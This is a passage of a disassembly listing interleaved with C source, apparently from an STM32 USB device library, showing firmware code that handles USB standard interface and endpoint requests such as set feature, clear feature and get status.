 800b6ac:	d14e      	bne.n	800b74c <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b6ae:	687b      	ldr	r3, [r7, #4]
 800b6b0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b6b4:	b2db      	uxtb	r3, r3
 800b6b6:	3b01      	subs	r3, #1
 800b6b8:	2b02      	cmp	r3, #2
 800b6ba:	d840      	bhi.n	800b73e <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b6bc:	683b      	ldr	r3, [r7, #0]
 800b6be:	889b      	ldrh	r3, [r3, #4]
 800b6c0:	b2db      	uxtb	r3, r3
 800b6c2:	2b01      	cmp	r3, #1
 800b6c4:	d836      	bhi.n	800b734 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b6c6:	683b      	ldr	r3, [r7, #0]
 800b6c8:	889b      	ldrh	r3, [r3, #4]
 800b6ca:	b2db      	uxtb	r3, r3
 800b6cc:	4619      	mov	r1, r3
 800b6ce:	6878      	ldr	r0, [r7, #4]
 800b6d0:	f7ff fed8 	bl	800b484 <USBD_CoreFindIF>
 800b6d4:	4603      	mov	r3, r0
 800b6d6:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b6d8:	7bbb      	ldrb	r3, [r7, #14]
 800b6da:	2bff      	cmp	r3, #255	; 0xff
 800b6dc:	d01d      	beq.n	800b71a <USBD_StdItfReq+0x92>
 800b6de:	7bbb      	ldrb	r3, [r7, #14]
 800b6e0:	2b00      	cmp	r3, #0
 800b6e2:	d11a      	bne.n	800b71a <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b6e4:	7bba      	ldrb	r2, [r7, #14]
 800b6e6:	687b      	ldr	r3, [r7, #4]
 800b6e8:	32ae      	adds	r2, #174	; 0xae
 800b6ea:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b6ee:	689b      	ldr	r3, [r3, #8]
 800b6f0:	2b00      	cmp	r3, #0
 800b6f2:	d00f      	beq.n	800b714 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b6f4:	7bba      	ldrb	r2, [r7, #14]
 800b6f6:	687b      	ldr	r3, [r7, #4]
 800b6f8:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b6fc:	7bba      	ldrb	r2, [r7, #14]
 800b6fe:	687b      	ldr	r3, [r7, #4]
 800b700:	32ae      	adds	r2, #174	; 0xae
 800b702:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b706:	689b      	ldr	r3, [r3, #8]
 800b708:	6839      	ldr	r1, [r7, #0]
 800b70a:	6878      	ldr	r0, [r7, #4]
 800b70c:	4798      	blx	r3
 800b70e:	4603      	mov	r3, r0
 800b710:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b712:	e004      	b.n	800b71e <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b714:	2303      	movs	r3, #3
 800b716:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b718:	e001      	b.n	800b71e <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b71a:	2303      	movs	r3, #3
 800b71c:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b71e:	683b      	ldr	r3, [r7, #0]
 800b720:	88db      	ldrh	r3, [r3, #6]
 800b722:	2b00      	cmp	r3, #0
 800b724:	d110      	bne.n	800b748 <USBD_StdItfReq+0xc0>
 800b726:	7bfb      	ldrb	r3, [r7, #15]
 800b728:	2b00      	cmp	r3, #0
 800b72a:	d10d      	bne.n	800b748 <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b72c:	6878      	ldr	r0, [r7, #4]
 800b72e:	f000 fdf1 	bl	800c314 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b732:	e009      	b.n	800b748 <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b734:	6839      	ldr	r1, [r7, #0]
 800b736:	6878      	ldr	r0, [r7, #4]
 800b738:	f000 fd21 	bl	800c17e <USBD_CtlError>
          break;
 800b73c:	e004      	b.n	800b748 <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b73e:	6839      	ldr	r1, [r7, #0]
 800b740:	6878      	ldr	r0, [r7, #4]
 800b742:	f000 fd1c 	bl	800c17e <USBD_CtlError>
          break;
 800b746:	e000      	b.n	800b74a <USBD_StdItfReq+0xc2>
          break;
 800b748:	bf00      	nop
      }
      break;
 800b74a:	e004      	b.n	800b756 <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b74c:	6839      	ldr	r1, [r7, #0]
 800b74e:	6878      	ldr	r0, [r7, #4]
 800b750:	f000 fd15 	bl	800c17e <USBD_CtlError>
      break;
 800b754:	bf00      	nop
  }

  return ret;
 800b756:	7bfb      	ldrb	r3, [r7, #15]
}
 800b758:	4618      	mov	r0, r3
 800b75a:	3710      	adds	r7, #16
 800b75c:	46bd      	mov	sp, r7
 800b75e:	bd80      	pop	{r7, pc}

0800b760 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b760:	b580      	push	{r7, lr}
 800b762:	b084      	sub	sp, #16
 800b764:	af00      	add	r7, sp, #0
 800b766:	6078      	str	r0, [r7, #4]
 800b768:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b76a:	2300      	movs	r3, #0
 800b76c:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b76e:	683b      	ldr	r3, [r7, #0]
 800b770:	889b      	ldrh	r3, [r3, #4]
 800b772:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b774:	683b      	ldr	r3, [r7, #0]
 800b776:	781b      	ldrb	r3, [r3, #0]
 800b778:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b77c:	2b40      	cmp	r3, #64	; 0x40
 800b77e:	d007      	beq.n	800b790 <USBD_StdEPReq+0x30>
 800b780:	2b40      	cmp	r3, #64	; 0x40
 800b782:	f200 817f 	bhi.w	800ba84 <USBD_StdEPReq+0x324>
 800b786:	2b00      	cmp	r3, #0
 800b788:	d02a      	beq.n	800b7e0 <USBD_StdEPReq+0x80>
 800b78a:	2b20      	cmp	r3, #32
 800b78c:	f040 817a 	bne.w	800ba84 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b790:	7bbb      	ldrb	r3, [r7, #14]
 800b792:	4619      	mov	r1, r3
 800b794:	6878      	ldr	r0, [r7, #4]
 800b796:	f7ff fe82 	bl	800b49e <USBD_CoreFindEP>
 800b79a:	4603      	mov	r3, r0
 800b79c:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b79e:	7b7b      	ldrb	r3, [r7, #13]
 800b7a0:	2bff      	cmp	r3, #255	; 0xff
 800b7a2:	f000 8174 	beq.w	800ba8e <USBD_StdEPReq+0x32e>
 800b7a6:	7b7b      	ldrb	r3, [r7, #13]
 800b7a8:	2b00      	cmp	r3, #0
 800b7aa:	f040 8170 	bne.w	800ba8e <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b7ae:	7b7a      	ldrb	r2, [r7, #13]
 800b7b0:	687b      	ldr	r3, [r7, #4]
 800b7b2:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b7b6:	7b7a      	ldrb	r2, [r7, #13]
 800b7b8:	687b      	ldr	r3, [r7, #4]
 800b7ba:	32ae      	adds	r2, #174	; 0xae
 800b7bc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7c0:	689b      	ldr	r3, [r3, #8]
 800b7c2:	2b00      	cmp	r3, #0
 800b7c4:	f000 8163 	beq.w	800ba8e <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b7c8:	7b7a      	ldrb	r2, [r7, #13]
 800b7ca:	687b      	ldr	r3, [r7, #4]
 800b7cc:	32ae      	adds	r2, #174	; 0xae
 800b7ce:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7d2:	689b      	ldr	r3, [r3, #8]
 800b7d4:	6839      	ldr	r1, [r7, #0]
 800b7d6:	6878      	ldr	r0, [r7, #4]
 800b7d8:	4798      	blx	r3
 800b7da:	4603      	mov	r3, r0
 800b7dc:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b7de:	e156      	b.n	800ba8e <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b7e0:	683b      	ldr	r3, [r7, #0]
 800b7e2:	785b      	ldrb	r3, [r3, #1]
 800b7e4:	2b03      	cmp	r3, #3
 800b7e6:	d008      	beq.n	800b7fa <USBD_StdEPReq+0x9a>
 800b7e8:	2b03      	cmp	r3, #3
 800b7ea:	f300 8145 	bgt.w	800ba78 <USBD_StdEPReq+0x318>
 800b7ee:	2b00      	cmp	r3, #0
 800b7f0:	f000 809b 	beq.w	800b92a <USBD_StdEPReq+0x1ca>
 800b7f4:	2b01      	cmp	r3, #1
 800b7f6:	d03c      	beq.n	800b872 <USBD_StdEPReq+0x112>
 800b7f8:	e13e      	b.n	800ba78 <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b7fa:	687b      	ldr	r3, [r7, #4]
 800b7fc:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b800:	b2db      	uxtb	r3, r3
 800b802:	2b02      	cmp	r3, #2
 800b804:	d002      	beq.n	800b80c <USBD_StdEPReq+0xac>
 800b806:	2b03      	cmp	r3, #3
 800b808:	d016      	beq.n	800b838 <USBD_StdEPReq+0xd8>
 800b80a:	e02c      	b.n	800b866 <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b80c:	7bbb      	ldrb	r3, [r7, #14]
 800b80e:	2b00      	cmp	r3, #0
 800b810:	d00d      	beq.n	800b82e <USBD_StdEPReq+0xce>
 800b812:	7bbb      	ldrb	r3, [r7, #14]
 800b814:	2b80      	cmp	r3, #128	; 0x80
 800b816:	d00a      	beq.n	800b82e <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b818:	7bbb      	ldrb	r3, [r7, #14]
 800b81a:	4619      	mov	r1, r3
 800b81c:	6878      	ldr	r0, [r7, #4]
 800b81e:	f001 fa21 	bl	800cc64 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b822:	2180      	movs	r1, #128	; 0x80
 800b824:	6878      	ldr	r0, [r7, #4]
 800b826:	f001 fa1d 	bl	800cc64 <USBD_LL_StallEP>
 800b82a:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b82c:	e020      	b.n	800b870 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800b82e:	6839      	ldr	r1, [r7, #0]
 800b830:	6878      	ldr	r0, [r7, #4]
 800b832:	f000 fca4 	bl	800c17e <USBD_CtlError>
              break;
 800b836:	e01b      	b.n	800b870 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b838:	683b      	ldr	r3, [r7, #0]
 800b83a:	885b      	ldrh	r3, [r3, #2]
 800b83c:	2b00      	cmp	r3, #0
 800b83e:	d10e      	bne.n	800b85e <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800b840:	7bbb      	ldrb	r3, [r7, #14]
 800b842:	2b00      	cmp	r3, #0
 800b844:	d00b      	beq.n	800b85e <USBD_StdEPReq+0xfe>
 800b846:	7bbb      	ldrb	r3, [r7, #14]
 800b848:	2b80      	cmp	r3, #128	; 0x80
 800b84a:	d008      	beq.n	800b85e <USBD_StdEPReq+0xfe>
 800b84c:	683b      	ldr	r3, [r7, #0]
 800b84e:	88db      	ldrh	r3, [r3, #6]
 800b850:	2b00      	cmp	r3, #0
 800b852:	d104      	bne.n	800b85e <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800b854:	7bbb      	ldrb	r3, [r7, #14]
 800b856:	4619      	mov	r1, r3
 800b858:	6878      	ldr	r0, [r7, #4]
 800b85a:	f001 fa03 	bl	800cc64 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800b85e:	6878      	ldr	r0, [r7, #4]
 800b860:	f000 fd58 	bl	800c314 <USBD_CtlSendStatus>

              break;
 800b864:	e004      	b.n	800b870 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800b866:	6839      	ldr	r1, [r7, #0]
 800b868:	6878      	ldr	r0, [r7, #4]
 800b86a:	f000 fc88 	bl	800c17e <USBD_CtlError>
              break;
 800b86e:	bf00      	nop
          }
          break;
 800b870:	e107      	b.n	800ba82 <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800b872:	687b      	ldr	r3, [r7, #4]
 800b874:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b878:	b2db      	uxtb	r3, r3
 800b87a:	2b02      	cmp	r3, #2
 800b87c:	d002      	beq.n	800b884 <USBD_StdEPReq+0x124>
 800b87e:	2b03      	cmp	r3, #3
 800b880:	d016      	beq.n	800b8b0 <USBD_StdEPReq+0x150>
 800b882:	e04b      	b.n	800b91c <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b884:	7bbb      	ldrb	r3, [r7, #14]
 800b886:	2b00      	cmp	r3, #0
 800b888:	d00d      	beq.n	800b8a6 <USBD_StdEPReq+0x146>
 800b88a:	7bbb      	ldrb	r3, [r7, #14]
 800b88c:	2b80      	cmp	r3, #128	; 0x80
 800b88e:	d00a      	beq.n	800b8a6 <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b890:	7bbb      	ldrb	r3, [r7, #14]
 800b892:	4619      	mov	r1, r3
 800b894:	6878      	ldr	r0, [r7, #4]
 800b896:	f001 f9e5 	bl	800cc64 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b89a:	2180      	movs	r1, #128	; 0x80
 800b89c:	6878      	ldr	r0, [r7, #4]
 800b89e:	f001 f9e1 	bl	800cc64 <USBD_LL_StallEP>
 800b8a2:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b8a4:	e040      	b.n	800b928 <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800b8a6:	6839      	ldr	r1, [r7, #0]
 800b8a8:	6878      	ldr	r0, [r7, #4]
 800b8aa:	f000 fc68 	bl	800c17e <USBD_CtlError>
              break;
 800b8ae:	e03b      	b.n	800b928 <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b8b0:	683b      	ldr	r3, [r7, #0]
 800b8b2:	885b      	ldrh	r3, [r3, #2]
 800b8b4:	2b00      	cmp	r3, #0
 800b8b6:	d136      	bne.n	800b926 <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800b8b8:	7bbb      	ldrb	r3, [r7, #14]
 800b8ba:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b8be:	2b00      	cmp	r3, #0
 800b8c0:	d004      	beq.n	800b8cc <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800b8c2:	7bbb      	ldrb	r3, [r7, #14]
 800b8c4:	4619      	mov	r1, r3
 800b8c6:	6878      	ldr	r0, [r7, #4]
 800b8c8:	f001 fa02 	bl	800ccd0 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800b8cc:	6878      	ldr	r0, [r7, #4]
 800b8ce:	f000 fd21 	bl	800c314 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800b8d2:	7bbb      	ldrb	r3, [r7, #14]
 800b8d4:	4619      	mov	r1, r3
 800b8d6:	6878      	ldr	r0, [r7, #4]
 800b8d8:	f7ff fde1 	bl	800b49e <USBD_CoreFindEP>
 800b8dc:	4603      	mov	r3, r0
 800b8de:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b8e0:	7b7b      	ldrb	r3, [r7, #13]
 800b8e2:	2bff      	cmp	r3, #255	; 0xff
 800b8e4:	d01f      	beq.n	800b926 <USBD_StdEPReq+0x1c6>
 800b8e6:	7b7b      	ldrb	r3, [r7, #13]
 800b8e8:	2b00      	cmp	r3, #0
 800b8ea:	d11c      	bne.n	800b926 <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800b8ec:	7b7a      	ldrb	r2, [r7, #13]
 800b8ee:	687b      	ldr	r3, [r7, #4]
 800b8f0:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800b8f4:	7b7a      	ldrb	r2, [r7, #13]
 800b8f6:	687b      	ldr	r3, [r7, #4]
 800b8f8:	32ae      	adds	r2, #174	; 0xae
 800b8fa:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8fe:	689b      	ldr	r3, [r3, #8]
 800b900:	2b00      	cmp	r3, #0
 800b902:	d010      	beq.n	800b926 <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b904:	7b7a      	ldrb	r2, [r7, #13]
 800b906:	687b      	ldr	r3, [r7, #4]
 800b908:	32ae      	adds	r2, #174	; 0xae
 800b90a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b90e:	689b      	ldr	r3, [r3, #8]
 800b910:	6839      	ldr	r1, [r7, #0]
 800b912:	6878      	ldr	r0, [r7, #4]
 800b914:	4798      	blx	r3
 800b916:	4603      	mov	r3, r0
 800b918:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800b91a:	e004      	b.n	800b926 <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800b91c:	6839      	ldr	r1, [r7, #0]
 800b91e:	6878      	ldr	r0, [r7, #4]
 800b920:	f000 fc2d 	bl	800c17e <USBD_CtlError>
              break;
 800b924:	e000      	b.n	800b928 <USBD_StdEPReq+0x1c8>
              break;
 800b926:	bf00      	nop
          }
          break;
 800b928:	e0ab      	b.n	800ba82 <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800b92a:	687b      	ldr	r3, [r7, #4]
 800b92c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b930:	b2db      	uxtb	r3, r3
 800b932:	2b02      	cmp	r3, #2
 800b934:	d002      	beq.n	800b93c <USBD_StdEPReq+0x1dc>
 800b936:	2b03      	cmp	r3, #3
 800b938:	d032      	beq.n	800b9a0 <USBD_StdEPReq+0x240>
 800b93a:	e097      	b.n	800ba6c <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b93c:	7bbb      	ldrb	r3, [r7, #14]
 800b93e:	2b00      	cmp	r3, #0
 800b940:	d007      	beq.n	800b952 <USBD_StdEPReq+0x1f2>
 800b942:	7bbb      	ldrb	r3, [r7, #14]
 800b944:	2b80      	cmp	r3, #128	; 0x80
 800b946:	d004      	beq.n	800b952 <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800b948:	6839      	ldr	r1, [r7, #0]
 800b94a:	6878      	ldr	r0, [r7, #4]
 800b94c:	f000 fc17 	bl	800c17e <USBD_CtlError>
                break;
 800b950:	e091      	b.n	800ba76 <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b952:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b956:	2b00      	cmp	r3, #0
 800b958:	da0b      	bge.n	800b972 <USBD_StdEPReq+0x212>
 800b95a:	7bbb      	ldrb	r3, [r7, #14]
 800b95c:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b960:	4613      	mov	r3, r2
 800b962:	009b      	lsls	r3, r3, #2
 800b964:	4413      	add	r3, r2
 800b966:	009b      	lsls	r3, r3, #2
 800b968:	3310      	adds	r3, #16
 800b96a:	687a      	ldr	r2, [r7, #4]
 800b96c:	4413      	add	r3, r2
 800b96e:	3304      	adds	r3, #4
 800b970:	e00b      	b.n	800b98a <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b972:	7bbb      	ldrb	r3, [r7, #14]
 800b974:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b978:	4613      	mov	r3, r2
 800b97a:	009b      	lsls	r3, r3, #2
 800b97c:	4413      	add	r3, r2
 800b97e:	009b      	lsls	r3, r3, #2
 800b980:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b984:	687a      	ldr	r2, [r7, #4]
 800b986:	4413      	add	r3, r2
 800b988:	3304      	adds	r3, #4
 800b98a:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800b98c:	68bb      	ldr	r3, [r7, #8]
 800b98e:	2200      	movs	r2, #0
 800b990:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800b992:	68bb      	ldr	r3, [r7, #8]
 800b994:	2202      	movs	r2, #2
 800b996:	4619      	mov	r1, r3
 800b998:	6878      	ldr	r0, [r7, #4]
 800b99a:	f000 fc61 	bl	800c260 <USBD_CtlSendData>
              break;
 800b99e:	e06a      	b.n	800ba76 <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800b9a0:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b9a4:	2b00      	cmp	r3, #0
 800b9a6:	da11      	bge.n	800b9cc <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800b9a8:	7bbb      	ldrb	r3, [r7, #14]
 800b9aa:	f003 020f 	and.w	r2, r3, #15
 800b9ae:	6879      	ldr	r1, [r7, #4]
 800b9b0:	4613      	mov	r3, r2
 800b9b2:	009b      	lsls	r3, r3, #2
 800b9b4:	4413      	add	r3, r2
 800b9b6:	009b      	lsls	r3, r3, #2
 800b9b8:	440b      	add	r3, r1
 800b9ba:	3324      	adds	r3, #36	; 0x24
 800b9bc:	881b      	ldrh	r3, [r3, #0]
 800b9be:	2b00      	cmp	r3, #0
 800b9c0:	d117      	bne.n	800b9f2 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b9c2:	6839      	ldr	r1, [r7, #0]
 800b9c4:	6878      	ldr	r0, [r7, #4]
 800b9c6:	f000 fbda 	bl	800c17e <USBD_CtlError>
                  break;
 800b9ca:	e054      	b.n	800ba76 <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800b9cc:	7bbb      	ldrb	r3, [r7, #14]
 800b9ce:	f003 020f 	and.w	r2, r3, #15
 800b9d2:	6879      	ldr	r1, [r7, #4]
 800b9d4:	4613      	mov	r3, r2
 800b9d6:	009b      	lsls	r3, r3, #2
 800b9d8:	4413      	add	r3, r2
 800b9da:	009b      	lsls	r3, r3, #2
 800b9dc:	440b      	add	r3, r1
 800b9de:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800b9e2:	881b      	ldrh	r3, [r3, #0]
 800b9e4:	2b00      	cmp	r3, #0
 800b9e6:	d104      	bne.n	800b9f2 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800b9e8:	6839      	ldr	r1, [r7, #0]
 800b9ea:	6878      	ldr	r0, [r7, #4]
 800b9ec:	f000 fbc7 	bl	800c17e <USBD_CtlError>
                  break;
 800b9f0:	e041      	b.n	800ba76 <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9f2:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b9f6:	2b00      	cmp	r3, #0
 800b9f8:	da0b      	bge.n	800ba12 <USBD_StdEPReq+0x2b2>
 800b9fa:	7bbb      	ldrb	r3, [r7, #14]
 800b9fc:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800ba00:	4613      	mov	r3, r2
 800ba02:	009b      	lsls	r3, r3, #2
 800ba04:	4413      	add	r3, r2
 800ba06:	009b      	lsls	r3, r3, #2
 800ba08:	3310      	adds	r3, #16
 800ba0a:	687a      	ldr	r2, [r7, #4]
 800ba0c:	4413      	add	r3, r2
 800ba0e:	3304      	adds	r3, #4
 800ba10:	e00b      	b.n	800ba2a <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800ba12:	7bbb      	ldrb	r3, [r7, #14]
 800ba14:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800ba18:	4613      	mov	r3, r2
 800ba1a:	009b      	lsls	r3, r3, #2
 800ba1c:	4413      	add	r3, r2
 800ba1e:	009b      	lsls	r3, r3, #2
 800ba20:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800ba24:	687a      	ldr	r2, [r7, #4]
 800ba26:	4413      	add	r3, r2
 800ba28:	3304      	adds	r3, #4
 800ba2a:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800ba2c:	7bbb      	ldrb	r3, [r7, #14]
 800ba2e:	2b00      	cmp	r3, #0
 800ba30:	d002      	beq.n	800ba38 <USBD_StdEPReq+0x2d8>
 800ba32:	7bbb      	ldrb	r3, [r7, #14]
 800ba34:	2b80      	cmp	r3, #128	; 0x80
 800ba36:	d103      	bne.n	800ba40 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800ba38:	68bb      	ldr	r3, [r7, #8]
 800ba3a:	2200      	movs	r2, #0
 800ba3c:	601a      	str	r2, [r3, #0]
 800ba3e:	e00e      	b.n	800ba5e <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800ba40:	7bbb      	ldrb	r3, [r7, #14]
 800ba42:	4619      	mov	r1, r3
 800ba44:	6878      	ldr	r0, [r7, #4]
 800ba46:	f001 f979 	bl	800cd3c <USBD_LL_IsStallEP>
 800ba4a:	4603      	mov	r3, r0
 800ba4c:	2b00      	cmp	r3, #0
 800ba4e:	d003      	beq.n	800ba58 <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800ba50:	68bb      	ldr	r3, [r7, #8]
 800ba52:	2201      	movs	r2, #1
 800ba54:	601a      	str	r2, [r3, #0]
 800ba56:	e002      	b.n	800ba5e <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800ba58:	68bb      	ldr	r3, [r7, #8]
 800ba5a:	2200      	movs	r2, #0
 800ba5c:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800ba5e:	68bb      	ldr	r3, [r7, #8]
 800ba60:	2202      	movs	r2, #2
 800ba62:	4619      	mov	r1, r3
 800ba64:	6878      	ldr	r0, [r7, #4]
 800ba66:	f000 fbfb 	bl	800c260 <USBD_CtlSendData>
              break;
 800ba6a:	e004      	b.n	800ba76 <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800ba6c:	6839      	ldr	r1, [r7, #0]
 800ba6e:	6878      	ldr	r0, [r7, #4]
